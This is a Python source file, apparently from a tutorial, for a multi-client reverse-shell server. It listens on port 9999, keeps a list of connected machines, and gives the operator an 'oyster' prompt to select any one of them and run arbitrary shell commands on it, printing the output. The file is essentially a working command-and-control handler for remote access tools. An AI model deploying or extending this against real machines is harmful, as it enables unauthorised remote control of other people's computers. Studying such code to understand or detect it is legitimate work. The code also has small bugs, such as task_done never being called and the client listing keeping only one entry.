'''
# Multiple clients with single server
> Sending commands to already connected client - Thread_2
> Listen and accept connections from the other clients - Thread_1
> Threading will help to achive this. We have to change the server.py file for multiple 
client communcations. client.py file will remain same.
'''

import socket
import sys
from threading import Thread
import time
from queue import Queue

# as we will be doing two things simultaneously so 2 threads
NUMBER_OF_THREADS = 2
#1 will listen, 2 will send commands
JOB_NUMBER = [1, 2]

queue = Queue()

# as every socket connection have two value conn object and adress list
all_connections = []
all_address = []

# In multi-client server setup socket creation and binding will be same as single client approach

def create_socket():
    '''
    Socket: connect two computers with port and ip address.
    '''
    try: 
        global host
        global port 
        global soc

        # ip address of the server
        host = ''
        # port number for the server where client will try to connect
        port = 9999
        # creating the socket
        soc = socket.socket()

    except socket.error as err:
        print("Socket error: " + str(err))

def bind_socket():
    try: 
        global host
        global port 
        global soc

        print("Binding the port: "+str(port))

        soc.bind((host, port))

        # listening to the client. the int value represents the number of bad connection it will tolerate until it will send an error
        soc.listen(5)

    except socket.error as err:
        # when socket binding fails we will retry again...
        print("Socket binding error: " + str(err) + "\n" + "Retrying....")
        bind_socket()

# 1st thread function
# Connection handling from multiple clients and saving in the list 
def accepting_connections():
    # Closing all previous connections when server.py file restarts
    for connection in all_connections:
        connection.close()
    
    # delete all the informations from the list aswell.
    del all_connections[:]
    del all_address[:]

    # accepting connections and addresses
    while True:
        try:
            conn, address = soc.accept()
            '''
            prevent timeout of connection. If a client is connected but we don't perform anywork 
            then connection will automatically timeout & disconnect. So setblocking will prevent that
            timeout.
            '''
            soc.setblocking(1)

            # appending the connections and addresses
            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established with.... " + address[0])

        except:
            print("Error accepting connections....")


'''
2nd thread functions - 
1. See all the clients
2. Select a client
3. Send commands to the connected client
'''
# interactive prompt(shell) for sending commands
def start_oyster():
    while True:
        # shell will show us - "oyster:>" similar to "ynouros@yn-pc:~"
        command = input("oyster-> ")
        '''
        # will show all the clients in the server with id 0,1,2,....
        oyster:> list
        0 Client - A 
        1 Client - B
        2 Client - C
        if functionality.... 
        
        elif functionality....
        selecting a client with id.
        oyster:> select 1
        0 Client - A
        1 Client - B # this will be selcted and send to function
        2 Client - C
        '''

        if command == 'list':
            list_connections()
        
        elif 'select' in command:
            conn = get_target(command)
            # If for some reason a client gets disconnected so we are checking to ensure if a specific client 
            # exists or not. 
            if conn is not None:   
                send_target_commands(conn)

        else:
            print("Command not recognizable....")

# displaying all active client connections
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            # checking if a connection is active by sending empty bytes data to client and receiving 
            # output form the client
            conn.send(str.encode(" "))
            conn.recv(20480)

        # if we don't receive anything then 
        except:
            # deleting inactive connection
            del all_connections[i]
            del all_address[i]
            continue 
        
        # 1 - 233.123.123.11 - 9999 : - id, ip, port
        results = str(i) + "  " + str(all_address[i][0] + "  " + str(all_address[i][1]))

    print("_______Clients_______" + "\n" + results)

# selecting a client
def get_target(command):
    # command value: select 1
    try:
        # removing the select with space so we can only targets the id
        target = command.replace('select ','')
        target_id = int(target)
        conn = all_connections[target_id]
        print("You are now connected to : "+ str(all_address[target_id][0]))
        print(str(all_address[target_id][0]) + "->", end="") # so the format: 192.168.0.4-> dir 
        return conn 

    except:
        print("Selection invalid!")
        return None

# multithreading for multitasking
# sending commands to clients, same as single server
def send_target_commands(conn):
    while True:
        try: 
            command = input()
            if command == 'quit':
                break
            if len(str.encode(command)) > 0:
                conn.send(str.encode(command))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end='')
        except:
            print("Error sending commands!")
            break

# create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = Thread(target=work)
        t.daemon = True # will help to release the memory of thread when main program ends
        t.start()

# do newxt job in the queue.... 
def work():
    while True:
        # getting queue's value such as 1 and 2
        x = queue.get()

        if x == 1:
            # handle connection
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            # send commands
            start_oyster()
        
        queue.task_done

# create jobs within queue
def create_jobs():
    for x in JOB_NUMBER:
        # inserting jobs to queue
        queue.put(x)
    
    queue.join()


create_workers()
create_jobs()